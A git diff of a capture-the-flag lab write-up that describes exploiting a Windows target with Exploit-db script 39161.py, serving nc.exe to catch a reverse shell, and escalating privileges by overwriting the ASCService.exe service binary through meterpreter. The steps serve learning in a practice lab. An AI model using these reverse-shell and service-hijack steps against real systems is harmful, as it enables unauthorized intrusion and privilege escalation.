@@ -364,16 +364,16 @@ It seems that no matter how I try to run this script, I can't get it to show the
 
 ### Task 4 - Exploit without Metasploit
 
-Use script 39161.py from Exploit-db.com. Edit script:
-* Set local IP
-* Set local port
-Use a web server to transfer Netcat binary, *nc.exe*. 
-* `sudo python3 -m http.server 80 ` // Note that you must start web seerver with `sudo` or you get an error because you need a server running on port 80. 
-Start a listener for the callback.
-* `nc -lvnp 4444`
-Fire the exploit script. 
-* `python3 39161.py <IP> <port>` The IP and port must match what you enter in the 39161.py script above. 
-At this point the target server should have called-back to your attacking machine. 
+* Use script 39161.py from Exploit-db.com. Edit script:
+	* Set local IP
+	* Set local port
+* Use a web server to transfer Netcat binary, *nc.exe*, to target machine. 
+	* `sudo python3 -m http.server 80 ` // Note that you must start web seerver with `sudo` or you get an error because you need a server running on port 80. 
+* Start a listener for the callback.
+	* `nc -lvnp 4444`
+* Fire the exploit script. 
+	* `python3 39161.py <IP> <port>` The IP and port must match what you enter in the 39161.py script above. 
+* At this point the target server should have called-back to your attacking machine. 
 
 **Frustration** 
 I've tried multiple times to make this work and just like with the PowerUp.ps1 script and exploiting the ASCService.exe overwrite, I couldn't get this to work. It has been very frustrating!
@@ -394,7 +394,7 @@ Start PowerShell in meterpreter
 * `powershell_shell`
 * Stop service `Stop-Service AdvancedSystemCareService9`
 * Move into ASC directory `cd 'C:\Program Files (x86)\IObit\Advanced SystemCare'`
-* Renaming, moving, deleting the ASCService.exe didn't work. So I just tried to upload my version hoping it would overwrite the existing file. It did! 
+* Renaming, moving, deleting the ASCService.exe didn't work. Not expecting it to work, I tried to upload my malicious version hoping it would overwrite the existing file. It did! 
 	* Exit out of PowerShell `CTRL-C`
 	* `upload ASCService.exe`
 	* File's last modified date didn't change but it was now the same size as my exploit. 
@@ -414,7 +414,7 @@ root.txt flag: 9a[REDACTED]80
 
 1. I am not sure why the PowerUp.ps1 script never displayed the `CanRestart` data. 
 2. I used the service exploit because the room told me to and I wanted to see if I could complete the exploit and priviledge escalation. 
-3. I ended up using my own hybrid solution. It was pretty, but it worked. 
-4. I didn't expect the upload of the malicious file to work. I was pleasantly surprised when it did. 
+3. I ended up using my own hybrid solution. It wasn't pretty, but it worked. 
+4. I didn't expect the upload of the malicious file overwriting the orignial file to work. I was pleasantly surprised when it did. 
 5. Nothing like the feeling of catching a reverse shell!
 
